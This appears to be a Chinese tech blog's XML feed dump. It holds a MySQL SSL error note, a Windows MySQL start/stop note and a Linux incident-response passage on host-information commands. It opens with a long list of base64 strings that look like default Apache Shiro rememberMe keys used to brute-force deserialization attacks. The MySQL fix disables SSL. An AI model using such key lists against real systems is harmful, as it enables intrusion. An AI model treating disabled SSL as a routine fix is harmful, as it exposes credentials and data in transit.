&#x27;cGljYXMAAAAAAAAAAAAAAA==&#x27;, &#x27;d2ViUmVtZW1iZXJNZUtleQ==&#x27;,<br>&#x27;fsHspZw/92PrS3XrPW+vxw==&#x27;,<br>&#x27;sHdIjUN6tzhl8xZMG3ULCQ==&#x27;, &#x27;WuB+y2gcHRnY2Lg9+Aqmqg==&#x27;, &#x27;ertVhmFLUs0KTA3Kprsdag==&#x27;, &#x27;2itfW92XazYRi5ltW0M2yA==&#x27;, &#x27;6ZmI6I2j3Y+R1aSn5BOlAA==&#x27;,<br>&#x27;f/SY5TIve5WWzT4aQlABJA==&#x27;, &#x27;Jt3C93kMR9D5e8QzwfsiMw==&#x27;, &#x27;aU1pcmFjbGVpTWlyYWNsZQ==&#x27;,<br>&#x27;XTx6CKLo/SdSgub+OPHSrw==&#x27;, &#x27;8AvVhmFLUs0KTA3Kprsdag==&#x27;,<br>&#x27;66v1O8keKNV3TTcGPK1wzg==&#x27;, &#x27;Q01TX0JGTFlLRVlfMjAxOQ==&#x27;, &#x27;5AvVhmFLUS0ATA4Kprsdag==&#x27;, &#x27;ZmFsYWRvLnh5ei5zaGlybw==&#x27;, &#x27;0AvVhmFLUs0KTA3Kprsdag==&#x27;,<br>&#x27;r0e3c16IdVkouZgk1TKVMg==&#x27;, &#x27;Z3VucwAAAAAAAAAAAAAAAA==&#x27;, &#x27;5J7bIJIV0LQSN3c9LPitBQ==&#x27;, &#x27;ZnJlc2h6Y24xMjM0NTY3OA==&#x27;, &#x27;yeAAo1E8BOeAYfBlm4NG9Q==&#x27;,<br>&#x27;a3dvbmcAAAAAAAAAAAAAAA==&#x27;, &#x27;4BvVhmFLUs0KTA3Kprsdag==&#x27;, &#x27;s0KTA3mFLUprK4AvVhsdag==&#x27;,<br>&#x27;yNeUgSzL/CfiWw1GALg6Ag==&#x27;, &#x27;OY//C4rhfwNxCQAQCrQQ1Q==&#x27;,<br>&#x27;fCq+/xW488hMTCD+cmJ3aQ==&#x27;, &#x27;ZAvph3dsQs0FSL3SDFAdag==&#x27;, &#x27;MTIzNDU2NzgxMjM0NTY3OA==&#x27;, &#x27;1AvVhdsgUs0FSA3SDFAdag==&#x27;, &#x27;Bf7MfkNR0axGGptozrebag==&#x27;,<br>&#x27;1QWLxg+NYmxraMoxAXu/Iw==&#x27;, &#x27;6AvVhmFLUs0KTA3Kprsdag==&#x27;, &#x27;6NfXkC7YVCV5DASIrEm1Rg==&#x27;, &#x27;2AvVhdsgUs0FSA3SDFAdag==&#x27;, &#x27;9FvVhtFLUs0KnA3Kprsdyg==&#x27;,<br>&#x27;OUHYQzxQ/W9e/UjiAGu6rg==&#x27;, &#x27;ClLk69oNcA3m+s0jIMIkpg==&#x27;, &#x27;vXP33AonIp9bFwGl7aT7rA==&#x27;,<br>&#x27;NGk/3cQ6F5/UNPRh8LpMIg==&#x27;, &#x27;MPdCMZ9urzEA50JDlDYYDg==&#x27;,<br>&#x27;c2hpcm9fYmF0aXMzMgAAAA==&#x27;, &#x27;XgGkgqGqYrix9lI6vxcrRw==&#x27;, &#x27;2A2V+RFLUs+eTA3Kpr+dag==&#x27;, &#x27;5AvVhmFLUs0KTA3Kprsdag==&#x27;, &#x27;3AvVhmFLUs0KTA3Kprsdag==&#x27;,<br>&#x27;WcfHGU25gNnTxTlmJMeSpw==&#x27;, &#x27;bWljcm9zAAAAAAAAAAAAAA==&#x27;, &#x27;bWluZS1hc3NldC1rZXk6QQ==&#x27;, &#x27;bXRvbnMAAAAAAAAAAAAAAA==&#x27;, &#x27;6ZmI6I2j5Y+R5aSn5ZOlAA==&#x27;,<br>&#x27;3JvYhmBLUs0ETA5Kprsdag==&#x27;, &#x27;A7UzJgh1+EWj5oBFi+mSgw==&#x27;, &#x27;Is9zJ3pzNh2cgTHB4ua3+Q==&#x27;, &#x27;25BsmdYwjnfcWmnhAciDDg==&#x27;, &#x27;cmVtZW1iZXJNZQAAAAAAAA==&#x27;,<br>&#x27;7AvVhmFLUs0KTA3Kprsdag==&#x27;, &#x27;3qDVdLawoIr1xFd6ietnwg==&#x27;, &#x27;Y1JxNSPXVwMkyvES/kJGeQ==&#x27;, &#x27;xVmmoltfpb8tTceuT5R7Bw==&#x27;, &#x27;O4pdf+7e+mZe8NyxMTPJmQ==&#x27;,<br>&#x27;SDKOLKn2J1j/2BHjeZwAoQ==&#x27;, &#x27;a2VlcE9uR29pbmdBbmRGaQ==&#x27;, &#x27;V2hhdCBUaGUgSGVsbAAAAA==&#x27;, &#x27;GAevYnznvgNCURavBhCr1w==&#x27;, &#x27;hBlzKg78ajaZuTE0VLzDDg==&#x27;,<br>&#x27;2cVtiE83c4lIrELJwKGJUw==&#x27;, &#x27;U3BAbW5nQmxhZGUAAAAAAA==&#x27;, &#x27;9AvVhmFLUs0KTA3Kprsdag==&#x27;, &#x27;SkZpbmFsQmxhZGUAAAAAAA==&#x27;, &#x27;lT2UvDUmQwewm6mMoiw4Ig==&#x27;,<br>&#x27;HWrBltGvEZc14h9VpMvZWw==&#x27;, &#x27;wGiHplamyXlVB11UXWol8g==&#x27;, &#x27;8BvVhmFLUs0KTA3Kprsdag==&#x27;, &#x27;bya2HkYo57u6fWh5theAWw==&#x27;, &#x27;IduElDUpDDXE677ZkhhKnQ==&#x27;,<br>&#x27;1tC/xrDYs8ey+sa3emtiYw==&#x27;, &#x27;MTIzNDU2Nzg5MGFiY2RlZg==&#x27;, &#x27;c+3hFGPjbgzGdrC+MHgoRQ==&#x27;, &#x27;rPNqM6uKFCyaL10AK51UkQ==&#x27;, &#x27;5aaC5qKm5oqA5pyvAAAAAA==&#x27;,<br>&#x27;cGhyYWNrY3RmREUhfiMkZA==&#x27;, &#x27;MzVeSkYyWTI2OFVLZjRzZg==&#x27;, &#x27;YI1+nBV//m7ELrIyDHm6DQ==&#x27;, &#x27;empodDEyMwAAAAAAAAAAAA==&#x27;, &#x27;NsZXjXVklWPZwOfkvk6kUA==&#x27;,<br>&#x27;ZUdsaGJuSmxibVI2ZHc9PQ==&#x27;, &#x27;L7RioUULEFhRyxM7a2R/Yg==&#x27;, &#x27;i45FVt72K2kLgvFrJtoZRw==&#x27;, &#x27;bXdrXl9eNjY2KjA3Z2otPQ==&#x27;, &#x27;sgIQrqUVxa1OZRRIK3hLZw==&#x27;,<br>&#x27;tiVV6g3uZBGfgshesAQbjA==&#x27;, &#x27;GsHaWo4m1eNbE0kNSMULhg==&#x27;, &#x27;l8cc6d2xpkT1yFtLIcLHCg==&#x27;, &#x27;KU471rVNQ6k7PQL4SqxgJg==&#x27;, &#x27;6Zm+6I2j5Y+R5aS+5ZOlAA==&#x27;,<br>&#x27;kPH+bIxk5D2deZiIxcabaA==&#x27;, &#x27;kPH+bIxk5D2deZiIxcacaA==&#x27;, &#x27;3AvVhdAgUs0FSA4SDFAdBg==&#x27;, &#x27;4AvVhdsgUs0F563SDFAdag==&#x27;, &#x27;FL9HL9Yu5bVUJ0PDU1ySvg==&#x27;,<br>&#x27;5RC7uBZLkByfFfJm22q/Zw==&#x27;, &#x27;eXNmAAAAAAAAAAAAAAAAAA==&#x27;, &#x27;fdCEiK9YvLC668sS43CJ6A==&#x27;, &#x27;FJoQCiz0z5XWz2N2LyxNww==&#x27;,<br>&#x27;HeUZ/LvgkO7nsa18ZyVxWQ==&#x27;,<br>&#x27;HoTP07fJPKIRLOWoVXmv+Q==&#x27;, &#x27;iycgIIyCatQofd0XXxbzEg==&#x27;,<br>&#x27;m0/5ZZ9L4jjQXn7MREr/bw==&#x27;, &#x27;NoIw91X9GSiCrLCF03ZGZw==&#x27;, &#x27;oPH+bIxk5E2enZiIxcqaaA==&#x27;,<br>&#x27;QAk0rp8sG0uJC4Ke2baYNA==&#x27;, &#x27;Rb5RN+LofDWJlzWAwsXzxg==&#x27;, &#x27;s2SE9y32PvLeYo+VGFpcKA==&#x27;, &#x27;SrpFBcVD89eTQ2icOD0TMg==&#x27;, &#x27;U0hGX2d1bnMAAAAAAAAAAA==&#x27;,<br>&#x27;Us0KvVhTeasAm43KFLAeng==&#x27;, &#x27;Ymx1ZXdoYWxlAAAAAAAAAA==&#x27;, &#x27;YWJjZGRjYmFhYmNkZGNiYQ==&#x27;, &#x27;zIiHplamyXlVB11UXWol8g==&#x27;, &#x27;ZjQyMTJiNTJhZGZmYjFjMQ==&#x27;,<br>&#x27;HOlg7NHb9potm0n5s4ic0Q==&#x27;, &#x27;2AvVhdsgUs0FSA3SaFAdfg==&#x27;, &#x27;4rvVhmFLUs0KAT3Kprsdag==&#x27;, &#x27;AF05JAuyuEB1ouJQ9Y9Phg==&#x27;, &#x27;UGlzMjAxNiVLeUVlXiEjLw==&#x27;,<br>&#x27;2AvVhdsgERdsSA3SDFAdag==&#x27;, &#x27;QF5HMyZAWDZYRyFnSGhTdQ==&#x27;, &#x27;8AvVhdsgUs0FSA3SDFAdag==&#x27;, &#x27;4AvVhmFLUs5KTA1Kprsdag==&#x27;, &#x27;4WCZSJyqdUQsije93aQIRg==&#x27;,<br>&#x27;3rvVhmFLUs0KAT3Kprsdag==&#x27;, &#x27;b2EAAAAAAAAAAAAAAAAAAA==&#x27;, &#x27;3AvVhMFLIs0KTA3Kprsdag==&#x27;, &#x27;4AvVhm2LUs0KTA3Kprsdag==&#x27;, &#x27;2AvVCXsxUs0FSA7SYFjdQg==&#x27;,<br>&#x27;Cj6LnKZNLEowAZrdqyH/Ew==&#x27;, &#x27;3qDVdLawoIr1xFd6ietnsg==&#x27;, &#x27;2AvVhdsgUsOFSA3SDFAdag==&#x27;, &#x27;FP7qKJzdJOGkzoQzo2wTmA==&#x27;, &#x27;wyLZMDifwq3sW1vhhHpgKA==&#x27;,<br>&#x27;5AvVhCsgUs0FSA3SDFAdag==&#x27;, &#x27;pbnA+Qzen1vjV3rNqQBLHg==&#x27;, &#x27;GhrF5zLfq1Dtadd1jlohhA==&#x27;, &#x27;2AvVhmFLUs0KTA3Kprsdag==&#x27;, &#x27;mIccZhQt6EBHrZIyw1FAXQ==&#x27;,<br>&#x27;4AvVhmFLUs0KTA3Kprseaf==&#x27;, &#x27;GHxH6G3LFh8Zb3NwoRgfFA==&#x27;, &#x27;B9rPF8FHhxKJZ9k63ik7kQ==&#x27;, &#x27;3AvVhmFLUs0KTA3KaTHGFg==&#x27;, &#x27;M2djA70UBBUPDibGZBRvrA==&#x27;,<br>&#x27;QDFCnfkLUs0KTA3Kprsdag==&#x27;, &#x27;2adsfasdqerqerqewradsf==&#x27;, &#x27;3Av2hmFLAs0BTA3Kprsd6E==&#x27;, &#x27;4AvVhmFLUsOKTA3Kprsdag==&#x27;, &#x27;Z3VucwACAOVAKALACAADSA==&#x27;,<br>&#x27;4AvVhmFLUs0KTA3KAAAAAA==&#x27;, &#x27;sBv2t3okbdm3U0r2EVcSzB==&#x27;, &#x27;5oiR5piv5p2h5ZK46bG8IQ==&#x27;,<br>&#x27;TGMPe7lGO/Gbr38QiJu1/w==&#x27;, &#x27;4AvVhmFLUs0TTA3Kprsdag==&#x27;,<br>&#x27;YWdlbnRAZG1AMjAxOHN3Zg==&#x27;, &#x27;Z3VucwAAAAAAAAAAAAABBB==&#x27;, &#x27;AztiX2RUqhc7dhOzl1Mj8Q==&#x27;, &#x27;FjbNm1avvGmWE9CY2HqV75==&#x27;, &#x27;QVN1bm5uJ3MgU3Vuc2l0ZQ==&#x27;,<br>&#x27;9Ami6v2G5Y+r5aPnE4OlBB==&#x27;, &#x27;2AvVidsaUSofSA3SDFAdog==&#x27;, &#x27;3AvVhdAgUs1FSA4SDFAdBg==&#x27;, &#x27;R29yZG9uV2ViAAAAAAAAAA==&#x27;, &#x27;wrjUh2ttBPQLnT4JVhriug==&#x27;,<br>&#x27;w793pPq5ZVBKkj8OhV4KaQ==&#x27;, &#x27;c2hvdWtlLXBsdXMuMjAxNg==&#x27;, &#x27;pyyX1c5x2f0LZZ7VKZXjKO==&#x27;, &#x27;duhfin37x6chw29jsne45m==&#x27;, &#x27;QUxQSEFNWVNPRlRCVUlMRA==&#x27;,<br>&#x27;YVd4dmRtVjViM1UlM0QIdn==&#x27;, &#x27;YnlhdnMAAAAAAAAAAAAAAA==&#x27;, &#x27;YystomRZLMUjiK0Q1+LFdw==&#x27;, &#x27;2AvVhdsgUs0FSA3SDFAder==&#x27;,<br>&#x27;A+kWR7o9O0/G/W6aOGesRA==&#x27;,<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>secvulns</category>
      
      <category>solr</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>secvulns</tag>
      
      <tag>solr</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mysql_error</title>
    <link href="/2024/03/13/db/mysql/mysql_error/"/>
    <url>/2024/03/13/db/mysql/mysql_error/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>对日常工作过程中遇到的mysql报错问题及解决方案汇总总结</p><h1 id="登录错误"><a href="#登录错误" class="headerlink" title="登录错误"></a>登录错误</h1><h2 id="unsupported-protocol"><a href="#unsupported-protocol" class="headerlink" title="unsupported protocol"></a>unsupported protocol</h2><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>终端中使用 mysql -h host -u name -p 命令连接mysql数据库，提示协议不支持</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><span class="hljs-keyword">ERROR </span>2026 (HY000): SSL connection error: error:0A000102:SSL routines::unsupported protocol<br></code></pre></td></tr></table></figure><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>增加–ssl-mode参数，忽略ssl认证</p><p>mysql -h host -u user -p –ssl-mode&#x3D;DISABLED</p><p>官方文档：</p><p><a href="https://dev.mysql.com/doc/refman/8.0/en/connection-options.html#option_general_ssl-mode">https://dev.mysql.com/doc/refman/8.0/en/connection-options.html#option_general_ssl-mode</a></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p>[1] ysql 客户端SSL错误2026 (HY000) tmaczt 2022-05-10 20:19:05</p><p>链接：<a href="https://blog.csdn.net/tmaczt/article/details/124696188">https://blog.csdn.net/tmaczt/article/details/124696188</a></p>]]></content>
    
    
    <categories>
      
      <category>db</category>
      
      <category>mysql</category>
      
      <category>mysql_error</category>
      
    </categories>
    
    
    <tags>
      
      <tag>db</tag>
      
      <tag>mysql</tag>
      
      <tag>mysql_error</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mysql_op</title>
    <link href="/2024/03/13/db/mysql/mysql_op/"/>
    <url>/2024/03/13/db/mysql/mysql_op/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记录日常mysql数据的操作命令</p><h1 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h1><h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="启动停止"><a href="#启动停止" class="headerlink" title="启动停止"></a>启动停止</h2><p>net start mysql</p><p>net stop mysql</p>]]></content>
    
    
    <categories>
      
      <category>db</category>
      
      <category>mysql</category>
      
      <category>mysql_op</category>
      
    </categories>
    
    
    <tags>
      
      <tag>db</tag>
      
      <tag>mysql</tag>
      
      <tag>mysql_op</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sec_response</title>
    <link href="/2024/03/12/security/secresponse/sec_response/"/>
    <url>/2024/03/12/security/secresponse/sec_response/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="主机信息收集"><a href="#主机信息收集" class="headerlink" title="主机信息收集"></a>主机信息收集</h2><h3 id="主机信息-hostnamectl"><a href="#主机信息-hostnamectl" class="headerlink" title="主机信息 hostnamectl"></a>主机信息 hostnamectl</h3><p>Static hostname ：主机名，来自&#x2F;etc&#x2F;hostname</p><p>Machine ID ：设备唯一标识</p><p>Virtualization：kvm 虚拟化，可以用来标记是否是虚拟机，物理机不存在该数据</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs scss">root<span class="hljs-keyword">@iZbp</span>1191gh7vw52537<span class="hljs-attribute">lyxrZ</span>:/tmp/test# hostnamectl<br> Static <span class="hljs-attribute">hostname</span>: iZbp1191gh7vw52537lyxrZ<br> Pretty <span class="hljs-attribute">hostname</span>: aliyun#@##@<br>       Icon <span class="hljs-attribute">name</span>: computer-vm<br>         <span class="hljs-attribute">Chassis</span>: vm<br>      Machine <span class="hljs-attribute">ID</span>: <span class="hljs-number">8</span>da0ace235c5435eb33ae56a538def68<br>         Boot <span class="hljs-attribute">ID</span>: <span class="hljs-number">5755</span>d1b8ae8c4e7cbe47b72434abc7ea<br>  <span class="hljs-attribute">Virtualization</span>: kvm<br>Operating <span class="hljs-attribute">System</span>: Ubuntu <span class="hljs-number">22.04</span>.<span class="hljs-number">2</span> LTS<br>          <span class="hljs-attribute">Kernel</span>: Linux <span class="hljs-number">5.15</span>.<span class="hljs-number">0</span>-<span class="hljs-number">73</span>-generic<br>    <span class="hljs-attribute">Architecture</span>: x86-<span class="hljs-number">64</span><br> Hardware <span class="hljs-attribute">Vendor</span>: Alibaba Cloud<br>  Hardware <span class="hljs-attribute">Model</span>: Alibaba Cloud ECS<br></code></pre></td></tr></table></figure><h3 id="系统时间-date"><a href="#系统时间-date" class="headerlink" title="系统时间 date"></a>系统时间 date</h3><p>确认当前系统时间是否正确，为文件时间属性判断提供依据</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:/tmp/test</span><span class="hljs-comment"># date</span><br><span class="hljs-title class_">Wed</span> <span class="hljs-title class_">Mar</span> <span class="hljs-number">13</span> <span class="hljs-number">11</span><span class="hljs-symbol">:</span><span class="hljs-number">06</span><span class="hljs-symbol">:</span><span class="hljs-number">55</span> <span class="hljs-title class_">AM</span> <span class="hljs-title class_">CST</span> <span class="hljs-number">2024</span><br></code></pre></td></tr></table></figure><h3 id="系统开机运行时间"><a href="#系统开机运行时间" class="headerlink" title="系统开机运行时间"></a>系统开机运行时间</h3><h4 id="who-b-开机时间"><a href="#who-b-开机时间" class="headerlink" title="who -b 开机时间"></a>who -b 开机时间</h4><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:/tmp/test</span><span class="hljs-comment"># who -b</span><br>         system boot  <span class="hljs-number">2023</span><span class="hljs-number">-07</span><span class="hljs-number">-10</span> <span class="hljs-number">11</span><span class="hljs-symbol">:</span><span class="hljs-number">11</span><br></code></pre></td></tr></table></figure><h4 id="uptime-p-运行时长"><a href="#uptime-p-运行时长" class="headerlink" title="uptime -p 运行时长"></a>uptime -p 运行时长</h4><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:/tmp/test</span><span class="hljs-comment"># uptime -p</span><br>up <span class="hljs-number">35</span> weeks, <span class="hljs-number">2</span> days, <span class="hljs-number">3</span> minutes<br></code></pre></td></tr></table></figure><h3 id="系统版本信息"><a href="#系统版本信息" class="headerlink" title="系统版本信息"></a>系统版本信息</h3><h4 id="lsb-release-a"><a href="#lsb-release-a" class="headerlink" title="lsb_release -a"></a><strong>lsb_release -a</strong></h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/tmp/test# lsb_release<br><span class="hljs-attribute">LSB</span> Version:core-<span class="hljs-number">11</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>ubuntu4-noarch:security-<span class="hljs-number">11</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>ubuntu4-noarch<br><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/tmp/test# lsb_release -a<br><span class="hljs-attribute">LSB</span> Version:core-<span class="hljs-number">11</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>ubuntu4-noarch:security-<span class="hljs-number">11</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>ubuntu4-noarch<br><span class="hljs-attribute">Distributor</span> ID:Ubuntu<br><span class="hljs-attribute">Description</span>:Ubuntu <span class="hljs-number">22</span>.<span class="hljs-number">04</span>.<span class="hljs-number">2</span> LTS<br><span class="hljs-attribute">Release</span>:<span class="hljs-number">22</span>.<span class="hljs-number">04</span><br><span class="hljs-attribute">Codename</span>:jammy<br></code></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">(base)</span> [<span class="hljs-string">root@aliyun-39_106_2_51</span> <span class="hljs-string">~</span>]<span class="hljs-comment"># lsb_release -a</span><br><span class="hljs-attr">LSB Version:</span><span class="hljs-string">:core-4.1-amd64:core-4.1-noarch</span><br><span class="hljs-attr">Distributor ID:</span><span class="hljs-string">CentOS</span><br><span class="hljs-attr">Description:</span><span class="hljs-string">CentOS</span> <span class="hljs-string">Linux</span> <span class="hljs-string">release</span> <span class="hljs-number">7.8</span><span class="hljs-number">.2003</span> <span class="hljs-string">(Core)</span><br><span class="hljs-attr">Release:</span><span class="hljs-number">7.8</span><span class="hljs-number">.2003</span><br><span class="hljs-attr">Codename:</span><span class="hljs-string">Core</span><br></code></pre></td></tr></table></figure><h5 id="CentOS系列"><a href="#CentOS系列" class="headerlink" title="CentOS系列"></a>CentOS系列</h5><p><strong>cat &#x2F;etc&#x2F;redhat-release</strong></p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livescript">(base) [root@<span class="hljs-number">110</span> cron.d]<span class="hljs-comment"># cat /etc/redhat-release</span><br>CentOS Linux release <span class="hljs-number">7.9</span>.<span class="hljs-number">2009</span> (Core)<br><br>centos6也可以查看 /etc/issue<br>[root@rdimtools1.ops.xlzbb1 /tmp]<span class="hljs-comment"># cat /etc/issue</span><br>CentOS release <span class="hljs-number">6.5</span> (Final)<br>Kernel <span class="hljs-string">\r</span> <span class="hljs-literal">on</span> an <span class="hljs-string">\m</span><br></code></pre></td></tr></table></figure><h3 id="内核版本-uname-a"><a href="#内核版本-uname-a" class="headerlink" title="内核版本 uname -a"></a>内核版本 uname -a</h3><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs llvm">ubuntu<span class="hljs-title">@VM-8-5-ubuntu</span>:~$ uname -a<br>Linux VM<span class="hljs-number">-8</span><span class="hljs-number">-5</span>-ubuntu <span class="hljs-number">5.4</span>.<span class="hljs-number">0</span><span class="hljs-number">-77</span>-generic <span class="hljs-variable">#86</span>-Ubuntu SMP Thu Jun <span class="hljs-number">17</span> <span class="hljs-number">02</span>:<span class="hljs-number">35</span>:<span class="hljs-number">03</span> UTC <span class="hljs-number">2021</span> <span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> <span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> <span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> GNU/Linux<br><br>(base) [root<span class="hljs-title">@110</span> cron.d]# uname -a<br>Linux <span class="hljs-number">110</span> <span class="hljs-number">3.10</span>.<span class="hljs-number">0</span><span class="hljs-number">-693.2</span>.<span class="hljs-number">2</span>.el<span class="hljs-number">7</span>.<span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> <span class="hljs-variable">#1</span> SMP Tue Sep <span class="hljs-number">12</span> <span class="hljs-number">22</span>:<span class="hljs-number">26</span>:<span class="hljs-number">13</span> UTC <span class="hljs-number">2017</span> <span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> <span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> <span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> GNU/Linux<br><br>[root<span class="hljs-title">@rdimtools1.ops.xlzbb1</span> /tmp]# uname -a<br>Linux rdimtools<span class="hljs-number">1</span>.ops.xlzbb<span class="hljs-number">1</span>.sinanode.com <span class="hljs-number">2.6</span>.<span class="hljs-number">32</span><span class="hljs-number">-431.11</span>.<span class="hljs-number">2</span>.el<span class="hljs-number">6</span>.toa.<span class="hljs-number">2</span>.<span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> <span class="hljs-variable">#1</span> SMP Wed Apr <span class="hljs-number">9</span> <span class="hljs-number">15</span>:<span class="hljs-number">55</span>:<span class="hljs-number">33</span> CST <span class="hljs-number">2014</span> <span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> <span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> <span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> GNU/Linux<br></code></pre></td></tr></table></figure><p>结果解释，如果只需要看内核版本，直接uname -r即可：</p><p>Linux 110 3.10.0-693.2.2.el7.x86_64 #1 SMP Tue Sep 12 22:26:13 UTC 2017 x86_64 x86_64 x86_64 GNU&#x2F;Linux</p><table><thead><tr><th>内核名称(-s)</th><th>主机名(-n)</th><th>内核(-r)</th><th>内核版本(-v)</th><th>硬件32位&#x2F;64位(-m)</th><th>处理器类型(-p)</th><th>硬件平台(-i)</th><th>操作系统(-o)</th></tr></thead><tbody><tr><td>Linux</td><td>110</td><td>3.10.0-693.2.2.el7.x86_64</td><td>#1 SMP Tue Sep 12 22:26:13 UTC 2017</td><td>x86_64</td><td>x86_64</td><td>x86_64</td><td>GNU&#x2F;Linux</td></tr></tbody></table><h3 id="主机名-hostname"><a href="#主机名-hostname" class="headerlink" title="主机名 hostname"></a>主机名 hostname</h3><p>cenots6：读取的是 &#x2F;etc&#x2F;sysconfig&#x2F;network 中的配置</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[root@rdimtools1.ops.xlzbb1 /tmp]</span><span class="hljs-comment"># cat /etc/sysconfig/network</span><br><span class="hljs-attr">NETWORKING</span>=<span class="hljs-literal">yes</span><br><span class="hljs-attr">HOSTNAME</span>=rdimtools1.ops.xlzbb1.node.com<br></code></pre></td></tr></table></figure><p>centos7,8&#x2F;ubuntu：读取的是 &#x2F;etc&#x2F;hostname中的值</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">(base) [root<span class="hljs-symbol">@110</span> cron.d]<span class="hljs-meta"># cat /etc/hostname</span><br><span class="hljs-number">110</span><br></code></pre></td></tr></table></figure><h2 id="止损"><a href="#止损" class="headerlink" title="止损"></a>止损</h2><h3 id="排查异常进程"><a href="#排查异常进程" class="headerlink" title="排查异常进程"></a>排查异常进程</h3><h4 id="检查高CPU进程"><a href="#检查高CPU进程" class="headerlink" title="检查高CPU进程"></a>检查高CPU进程</h4><h5 id="top-c-o-CPU"><a href="#top-c-o-CPU" class="headerlink" title="top -c -o +%CPU"></a>top -c -o +%CPU</h5><p>以CPU占比倒序</p><h5 id="ps-eo-pid-ppid-cpu-mem-cmd-–sort-cpu-head-n-5"><a href="#ps-eo-pid-ppid-cpu-mem-cmd-–sort-cpu-head-n-5" class="headerlink" title="ps -eo pid,ppid,%cpu,%mem,cmd –sort&#x3D;-%cpu | head -n 5"></a><strong>ps -eo pid,ppid,%cpu,%mem,cmd –sort&#x3D;-%cpu | head -n 5</strong></h5><p>ps查询进程，显示pid，ppid，cpu占比，内存占比，进程信息，以cpu占比倒序，只显示top5</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~# ps -eo pid,ppid,%cpu,%mem,cmd --sort=-%cpu | head -n <span class="hljs-number">5</span><br>    <span class="hljs-attribute">PID</span>    PPID %CPU %MEM CMD<br> <span 